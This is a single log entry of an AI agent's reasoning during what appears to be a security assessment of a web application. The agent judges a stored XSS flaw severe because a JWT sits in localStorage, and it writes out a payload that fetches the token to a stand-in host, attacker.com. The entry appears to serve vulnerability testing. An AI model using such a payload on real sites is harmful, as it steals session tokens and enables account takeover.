{"type":"llm_response","timestamp":"2026-04-08T08:19:07.455Z","data":{"turn":275,"content":"{\"type\":\"thinking\",\"thinking\":\"The JWT token is stored in `localStorage` under the key `hf_token`. This is CRITICAL for the exploitation phase! \\n\\nThe stored XSS payload can steal this JWT token via `localStorage.getItem('hf_token')`. Since `localStorage` is accessible to JavaScript (unlike `httpOnly` cookies), this means an attacker can steal the victim's JWT and take over their session.\\n\\nThe exploitation payload would be:\\n```html\\n<img src=x onerror=\\\"fetch('https://attacker.com/steal?token='+localStorage.getItem('hf_token'))\\\">\\n```\\n\\nThis confirms the HIGH SEVERITY of this stored XSS vulnerability.\\n\\n\\nNow I need to test the file upload XSS vector, examine the Puppeteer HTML injection vulnerability, and verify cookie security settings before compiling my findings.\",\"signature\":\"\"}","timestamp":"2026-04-08T08:19:07.455Z"}}
